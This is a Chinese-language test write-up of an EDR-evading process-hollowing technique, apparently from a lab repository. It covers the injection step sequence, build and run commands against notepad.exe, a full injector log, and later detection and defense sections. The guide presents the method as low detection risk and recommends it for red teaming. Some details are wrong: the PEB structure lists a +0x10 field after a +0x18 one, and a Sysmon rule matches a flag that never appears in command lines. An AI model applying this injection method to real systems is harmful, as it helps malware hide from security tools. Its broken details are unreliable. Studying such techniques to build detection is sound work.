# Advanced Process Hollowing - 测试指南

## 技术概述

**Advanced Process Hollowing** 是一种改进型进程镂空（Process Hollowing）技术，其核心创新在于**不使用 NtUnmapViewOfSection** API，从而大幅降低 EDR 检测风险。

**原始项目**: [itaymigdal/PichichiH0ll0wer](https://github.com/itaymigdal/PichichiH0ll0wer)

**MITRE ATT&CK**: [T1055.012 - Process Injection: Process Hollowing](https://attack.mitre.org/techniques/T1055/012/)

### 为什么要避免 NtUnmapViewOfSection？

**传统 Process Hollowing 的问题**:

```
CreateProcess(挂起) → NtUnmapViewOfSection(卸载原始镜像) → VirtualAllocEx → 写入 Payload → ResumeThread
```

**致命问题**: `NtUnmapViewOfSection` 是极其可疑的 API 调用
- 正常应用几乎从不调用此 API
- EDR/AV 重点监控的可疑行为
- 出现此调用基本等同于告诉 EDR："我在搞注入！"

### 改进思路

**核心理念**: "既然卸载原始镜像会被检测，那就不卸载！"

```
CreateProcess(挂起) → VirtualAllocEx(新内存) → 写入 Payload → 修改 PEB→ImageBase → ResumeThread
```

**关键变化**:
1. **不卸载原始镜像** - 原始 exe（如 notepad.exe）依然在内存中
2. **分配新内存** - 为 payload 分配独立内存区域
3. **劫持 PEB** - 修改 PEB→ImageBase 指向新内存
4. **欺骗加载器** - Windows 加载器认为新内存才是"真正的程序"

**结果**: 原始镜像成为"僵尸"，payload 成为实际执行代码

### 技术流程

```
[读取 Payload PE]
       ↓
[CreateProcessA(CREATE_SUSPENDED)]
       ↓
[NtQueryInformationProcess]  ← 获取 PEB 地址
       ↓
[VirtualAllocEx]  ← 分配新内存（尝试首选地址）
       ↓
[WriteProcessMemory]  ← 复制 PE 头部和所有节
       ↓
[WriteProcessMemory(PEB + 0x10)]  ← 修改 ImageBase 指针
       ↓
[应用重定位]  ← 如果未加载到首选地址
       ↓
[GetThreadContext + SetThreadContext]  ← 修改 RCX 寄存器（入口点）
       ↓
[ResumeThread]  ← 恢复执行
       ↓
[Payload 执行！]  ✓
```

---

## 测试环境

- **操作系统**：Windows 10 x64
- **编译器**：GCC (MinGW-w64) 13.2.0
- **测试日期**：2025-10-08
- **测试工具**：techniques/11-advanced-hollowing/build/advanced_hollowing.exe

---

## 测试步骤

### 1. 编译项目

```bash
cd techniques/11-advanced-hollowing

# 编译主程序
./build.bat
```

**编译输出：**
```
===================================================================
Building Advanced Process Hollowing
===================================================================

[*] Step 1: Compiling advanced_hollowing.exe...
[+] advanced_hollowing.exe compiled successfully

[*] Step 2: Checking for test payload...
[!] No test payload found
[*] You can use any PE executable as payload for testing
```

### 2. 创建测试 Payload

创建一个简单的测试程序作为 payload：

```c
// test_payload.c
#include <windows.h>
#include <stdio.h>

int main() {
    // 创建验证文件
    HANDLE hFile = CreateFileA(
        "C:\\Users\\Public\\advanced_hollowing_verified.txt",
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile != INVALID_HANDLE_VALUE) {
        const char* msg = "Advanced Process Hollowing Verified!\n"
                         "Payload executed successfully!\n"
                         "Technique: No NtUnmapViewOfSection used\n"
                         "Method: Modified PEB->ImageBase to point to new memory\n";
        DWORD written;
        WriteFile(hFile, msg, strlen(msg), &written, NULL);
        CloseHandle(hFile);
    }

    MessageBoxA(NULL, "Advanced Hollowing Payload Executed!", "Success", MB_OK);
    return 0;
}
```

**编译 payload：**
```bash
cd build
gcc test_payload.c -o test_payload.exe -O2 -s -mwindows
```

### 3. 执行注入测试

```bash
cd build

# 运行注入器
./advanced_hollowing.exe "C:\Windows\System32\notepad.exe" test_payload.exe
```

**测试输出：**
```
===================================================================
Advanced Process Hollowing (No NtUnmapViewOfSection)
Based on: PichichiH0ll0wer by itaymigdal
===================================================================

[*] Target: C:\Windows\System32\notepad.exe
[*] Payload: test_payload.exe

[*] Step 1: Reading payload PE file...
[+] Payload loaded: 16896 bytes

[*] Step 2: Parsing PE headers...
[+] Preferred ImageBase: 0x0000000140000000
[+] Image Size: 0xC000
[+] Entry Point RVA: 0x13D0

[*] Step 3: Creating suspended target process...
[+] Process created (PID: 108560)

[*] Step 4: Retrieving PEB address...
[+] PEB Address: 0x000000F905F8E000

[*] Step 5: Allocating memory in target process...
[*] Trying preferred address: 0x0000000140000000
[+] New ImageBase: 0x0000000140000000
[+] New EntryPoint: 0x00000001400013D0

[*] Step 6: Copying PE headers...
[+] Headers copied

[*] Step 7: Copying PE sections...
[*] Section 0: .text (0x1C00 bytes at 0x0000000140001000)
[*] Section 1: .data (0x200 bytes at 0x0000000140003000)
[*] Section 2: .rdata (0x800 bytes at 0x0000000140004000)
[*] Section 3: .pdata (0x400 bytes at 0x0000000140005000)
[*] Section 4: .xdata (0x200 bytes at 0x0000000140006000)
[*] Section 5: .bss (0x0 bytes at 0x0000000140007000)
[*] Section 6: .idata (0xC00 bytes at 0x0000000140008000)
[*] Section 7: .CRT (0x200 bytes at 0x0000000140009000)
[*] Section 8: .tls (0x200 bytes at 0x000000014000A000)
[*] Section 9: .reloc (0x200 bytes at 0x000000014000B000)
[+] All sections copied

[*] Step 8: Updating PEB->ImageBase...
[+] PEB->ImageBase updated to: 0x0000000140000000

[*] Step 9: Applying relocations...
[+] Loaded at preferred address, no relocation needed

[*] Step 10: Updating thread context (RCX register)...
[*] Original RCX: 0x7FF7EF79B710
[*] New RCX (EntryPoint): 0x1400013D0
[+] Thread context updated

[*] Step 11: Resuming thread...
[+] Thread resumed

===================================================================
[+] Advanced Hollowing completed successfully!
===================================================================

[*] Waiting 5 seconds for payload to execute...
[+] Verification file found - Payload executed successfully!
[+] Target process still running (PID: 108560)
```

### 4. 验证注入成功

```bash
cat C:\Users\Public\advanced_hollowing_verified.txt
```

**验证结果：**
```
Advanced Process Hollowing Verified!
Payload executed successfully!
Technique: No NtUnmapViewOfSection used
Method: Modified PEB->ImageBase to point to new memory
```

✅ **成功标志**：
- 验证文件被成功创建
- 包含技术确认信息
- 目标进程仍在运行
- MessageBox 弹窗显示成功

---

## 测试结果

### ✅ 测试成功

**测试用例：**
- **目标进程**：notepad.exe
- **Payload**：test_payload.exe (自定义 PE 文件)
- **注入方式**：Advanced Process Hollowing (No NtUnmapViewOfSection)

**验证证据：**
1. ✅ 读取 Payload PE 成功 (16896 bytes)
2. ✅ 解析 PE 头部成功
   - ImageBase: 0x0000000140000000
   - SizeOfImage: 0xC000
   - EntryPoint: 0x13D0
3. ✅ 创建挂起进程成功 (PID: 108560)
4. ✅ 获取 PEB 地址成功 (0x000000F905F8E000)
5. ✅ 分配内存成功（在首选地址）
6. ✅ 复制 PE 头部和所有节成功
7. ✅ 更新 PEB→ImageBase 成功
8. ✅ 应用重定位（首选地址，无需重定位）
9. ✅ 更新线程上下文成功（RCX 寄存器）
10. ✅ 恢复线程执行成功
11. ✅ **关键验证**：Payload 成功执行
12. ✅ **验证文件创建**：确认技术有效

---

## 关键发现

### 1. PEB 结构（x64）

```c
typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PVOID Ldr;                      // +0x18
    PVOID ProcessParameters;        // +0x20
    // ...
    PVOID ImageBaseAddress;         // +0x10  ← 关键！
    // ...
} PEB;
```

**测试结果**：
- PEB 地址：`0x000000F905F8E000`
- 原始 ImageBase（notepad.exe）：已被忽略
- 新 ImageBase（payload）：`0x0000000140000000`

### 2. 无需卸载原始镜像

```
内存布局：

[原始 notepad.exe 镜像]  ← 仍然在内存中，但被忽略
地址：0x00007FF7EF670000

[新 Payload 镜像]        ← PEB→ImageBase 指向这里
地址：0x0000000140000000

Windows 加载器查看 PEB→ImageBase → 找到新镜像 → 执行 Payload
```

**关键点**：
- 原始镜像没有被卸载（`NtUnmapViewOfSection` 未调用）
- 新镜像在不同的地址空间
- Windows 通过 PEB→ImageBase 确定"真正的程序"

### 3. 线程上下文劫持

```c
// 原始线程上下文
RCX = 0x7FF7EF79B710  // notepad.exe 的入口点

// 修改后的线程上下文
RCX = 0x1400013D0     // payload 的入口点

// Windows 线程启动流程：
// 1. 从挂起状态恢复
// 2. 读取 RCX 寄存器作为入口点
// 3. 跳转到 RCX 指定的地址执行
// 4. 执行我们的 payload！
```

### 4. PE 重定位机制

```c
// 如果 Payload 未加载到首选地址
if (newImageBase != preferredBase) {
    // 计算偏移量
    LONGLONG delta = (LONGLONG)newImageBase - (LONGLONG)preferredBase;

    // 遍历 .reloc 节
    for each relocation entry:
        fixupAddress = newImageBase + entry.PageRVA + entry.Offset
        *fixupAddress += delta  // 修正绝对地址引用
}
```

**测试结果**：
- 成功加载到首选地址 `0x0000000140000000`
- 无需应用重定位
- 如果首选地址不可用，会自动重定位

### 5. 与传统 Process Hollowing 对比

| 步骤 | 传统 Process Hollowing | Advanced Process Hollowing |
|------|----------------------|---------------------------|
| **创建进程** | CREATE_SUSPENDED | CREATE_SUSPENDED |
| **卸载原始镜像** | **NtUnmapViewOfSection** ❌ | **无需卸载** ✅ |
| **分配内存** | VirtualAllocEx | VirtualAllocEx |
| **写入 Payload** | WriteProcessMemory | WriteProcessMemory |
| **劫持执行** | 修改入口点代码 | **修改 PEB→ImageBase** ✅ |
| **EDR 检测** | **高风险** ❌ | **低风险** ✅ |

---

## 技术特点

### 优势

1. **避免 NtUnmapViewOfSection**
   - 不触发 EDR 的高危 API 监控
   - 行为更像正常进程创建
   - 大幅降低检测风险

2. **高隐蔽性**
   - 原始镜像仍在内存（伪装）
   - 不修改原始代码段
   - 利用合法的 PEB 机制

3. **稳定性高**
   - 完整的 PE 加载流程
   - 支持重定位
   - 支持任意 PE 文件作为 payload

4. **灵活性强**
   - 可注入任何 PE 文件（exe/dll）
   - 支持不同架构（x86/x64）
   - 可自定义目标进程

### 劣势

1. **仍需 VirtualAllocEx**
   - 远程内存分配仍可能被检测
   - 需要 PAGE_EXECUTE_READWRITE 权限

2. **PEB 修改可检测**
   - EDR 可监控 PEB 的写操作
   - 需要写入 PEB+0x10 偏移

3. **线程上下文修改**
   - GetThreadContext/SetThreadContext 可被监控
   - 修改寄存器是可疑行为

4. **仅适用于新进程**
   - 必须创建挂起进程
   - 无法注入已运行的进程

---

## 与其他技术对比

| 特性 | Process Hollowing | Transacted Hollowing | Advanced Hollowing |
|------|-------------------|---------------------|-------------------|
| **NtUnmapViewOfSection** | ✅ 需要 | ✅ 需要 | **❌ 不需要** |
| **VirtualAllocEx** | ✅ 需要 | ✅ 需要 | ✅ 需要 |
| **PEB 修改** | ❌ 不需要 | ❌ 不需要 | **✅ 需要** |
| **EDR 检测风险** | **高** | 高 | **低** |
| **技术复杂度** | 中 | 高 | 中 |
| **Payload 类型** | 完整 PE | 完整 PE | 完整 PE |

---

## 检测方法

### 1. 行为特征

```python
suspicious_sequence = [
    "CreateProcessA(..., CREATE_SUSPENDED)",          # 创建挂起进程
    "NtQueryInformationProcess(...)",                 # 查询 PEB
    "VirtualAllocEx(..., PAGE_EXECUTE_READWRITE)",    # 分配可执行内存
    "WriteProcessMemory(PEB + 0x10, ...)",            # 修改 ImageBase
    "SetThreadContext(...)",                          # 修改线程上下文
    "ResumeThread(...)"                               # 恢复执行
]

# 关键差异：没有 NtUnmapViewOfSection！
```

### 2. PEB 完整性检查

```c
// 检测 PEB→ImageBase 是否被劫持
void DetectAdvancedHollowing(HANDLE hProcess) {
    // 1. 获取 PEB 地址
    PVOID pebAddress = GetProcessPeb(hProcess);

    // 2. 读取 ImageBase
    PVOID imageBase;
    ReadProcessMemory(hProcess, (PBYTE)pebAddress + 0x10,
                     &imageBase, sizeof(PVOID), NULL);

    // 3. 检查 ImageBase 是否指向合法模块
    if (!IsValidModuleBase(hProcess, imageBase)) {
        Alert("ImageBase hijacked! (Advanced Hollowing detected)");
    }

    // 4. 检查原始镜像是否仍在内存
    PVOID originalBase = GetOriginalImageBase(hProcess);
    if (originalBase != NULL && originalBase != imageBase) {
        Alert("Two images in memory! (Original image not unmapped)");
    }
}
```

### 3. 内存扫描

```c
// 检测进程中是否有多个 PE 镜像
void ScanForMultiplePE(HANDLE hProcess) {
    MEMORY_BASIC_INFORMATION mbi;
    PVOID address = NULL;
    int peCount = 0;

    while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi))) {
        if (mbi.State == MEM_COMMIT && mbi.Protect == PAGE_EXECUTE_READ) {
            // 检查是否是 PE 头
            BYTE buffer[2];
            ReadProcessMemory(hProcess, mbi.BaseAddress, buffer, 2, NULL);
            if (buffer[0] == 'M' && buffer[1] == 'Z') {
                peCount++;
            }
        }
        address = (PVOID)((ULONG_PTR)mbi.BaseAddress + mbi.RegionSize);
    }

    if (peCount > 1) {
        Alert("Multiple PE images detected!");
    }
}
```

### 4. EDR 检测规则

| 检测点 | 风险等级 | 描述 |
|--------|----------|------|
| 修改 PEB→ImageBase | **非常高** | 劫持进程镜像基址 |
| 两个 PE 镜像在内存 | **高** | 原始镜像未卸载 |
| RWX 内存分配 | 高 | 可执行且可写 |
| 修改线程上下文（RCX） | 高 | 劫持入口点 |
| 组合行为（无 NtUnmapViewOfSection） | **非常高** | Advanced Hollowing 特征 |

---

## 防御建议

### 对于安全产品

1. **PEB 监控**
   ```c
   // Hook WriteProcessMemory，监控对 PEB 的写入
   if (targetAddress == PEB + 0x10) {
       Alert("PEB->ImageBase modification detected!");
   }
   ```

2. **内存扫描**
   ```c
   // 定期扫描进程内存，检测多个 PE 镜像
   void PeriodicMemoryScan() {
       for each process:
           ScanForMultiplePE(hProcess);
   }
   ```

3. **线程上下文监控**
   ```c
   // Hook SetThreadContext，检测可疑修改
   if (context->Rcx != expectedEntryPoint) {
       Alert("Thread context hijacked!");
   }
   ```

### 对于系统管理员

1. **启用 HVCI**
   ```powershell
   Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "EnableVirtualizationBasedSecurity" -Value 1
   ```

2. **应用白名单**
   - 限制创建挂起进程的权限
   - 禁止非授权程序进行内存操作

3. **Sysmon 监控**
   ```xml
   <RuleGroup groupRelation="or">
     <ProcessCreate onmatch="include">
       <CommandLine condition="contains">CREATE_SUSPENDED</CommandLine>
     </ProcessCreate>
     <ProcessAccess onmatch="include">
       <CallTrace condition="contains">VirtualAllocEx</CallTrace>
       <CallTrace condition="contains">SetThreadContext</CallTrace>
     </ProcessAccess>
   </RuleGroup>
   ```

---

## 参考资料

### 原始项目

- [itaymigdal/PichichiH0ll0wer](https://github.com/itaymigdal/PichichiH0ll0wer)

### MITRE ATT&CK

- [T1055.012 - Process Injection: Process Hollowing](https://attack.mitre.org/techniques/T1055/012/)

### 技术文章

- [Process Hollowing and Portable Executable Relocations](https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations)
- [Advanced Process Hollowing Techniques](https://malware.news/t/process-hollowing-techniques/45816)

### 相关技术

- [Process Hollowing (技术1)](../01-process-hollowing/)
- [Transacted Hollowing (技术2)](../02-transacted-hollowing/)

---

## 总结

### ✅ 技术状态：完全成功

**验证结论**：
- Advanced Process Hollowing 技术在 Windows 10 x64 上完全有效
- 所有注入步骤执行成功
- Payload 被成功执行（通过验证文件和 MessageBox 确认）
- **关键优势**：无需 NtUnmapViewOfSection，降低 EDR 检测风险

### 推荐使用场景

1. **红队演练**：高隐蔽性的进程注入
2. **EDR 测试**：测试对非传统注入技术的检测能力
3. **恶意软件分析**：理解现代注入技术
4. **安全研究**：研究 PEB 机制和进程加载

### 防御建议

1. **PEB 完整性检查**：监控 ImageBase 修改
2. **内存扫描**：检测多个 PE 镜像
3. **行为监控**：检测可疑 API 调用序列
4. **线程上下文监控**：检测入口点劫持

---

**测试完成日期**：2025-10-08
**技术状态**：✅ 完全成功
**Windows 兼容性**：✅ Windows 10/11 x64
**关键优势**：✅ 无需 NtUnmapViewOfSection（降低检测风险）
